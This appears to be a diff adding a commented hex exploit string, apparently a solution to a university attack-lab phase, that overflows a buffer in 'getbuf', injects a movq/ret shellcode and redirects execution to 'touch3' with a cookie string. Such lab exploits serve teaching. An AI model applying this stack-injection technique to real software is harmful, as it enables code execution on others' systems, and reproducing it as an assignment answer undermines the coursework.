@@ -1,0 +1,6 @@
+48 c7 c7 40 49 62 55 c3 //IC - movq $0x55624940, %rdi. Moves rsp+10 (cookie) into rdi. rsp + 8 bytes (rsp addr.)+ 8 bytes (touch 3 address)
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 //Overflow
+18 49 62 55 00 00 00 00 //Address of rsp - 18. (rsp used in getbuf)
+9d 16 40 00 00 00 00 00 //touch3 address
+31 62 39 33 37 34 37 63 00 //Cookie (1b93747c) written using ascii. Use 00 at the end to represent string
